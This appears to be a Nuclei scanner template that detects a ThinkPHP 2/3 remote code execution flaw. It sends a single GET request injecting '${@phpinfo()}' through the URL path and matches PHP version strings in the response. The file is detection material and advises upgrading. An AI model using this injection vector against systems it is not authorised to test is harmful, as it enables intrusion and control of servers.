id: thinkphp-2-rce
info:
  name: ThinkPHP 2/3 - Remote Code Execution
  author: dr_set
  severity: critical
  description: The vulnerability known as thinkphp-2-rce allows attackers to remotely
    execute code and gain control over a compromised system without requiring credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/2-rce
  tags: thinkphp,rce
  metadata:
    impact: The discovery of the thinkphp-2-rce vulnerability highlights the significant
      impact a remote code execution attack can have on a system, allowing attackers
      to execute malicious code, access sensitive data, and take control of compromised
      systems without proper authentication measures in place.
    recommendation: It is recommended to update ThinkPHP 2.x and 3.0 in Lite mode
      to a secure version to prevent remote code execution vulnerabilities.
requests:
- method: GET
  path:
  - '{{BaseURL}}/index.php?s=/index/index/name/$%7B@phpinfo()%7D'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - PHP Extension
    - PHP Version
    - ThinkPHP
    condition: and
  - type: status
    status:
    - 200
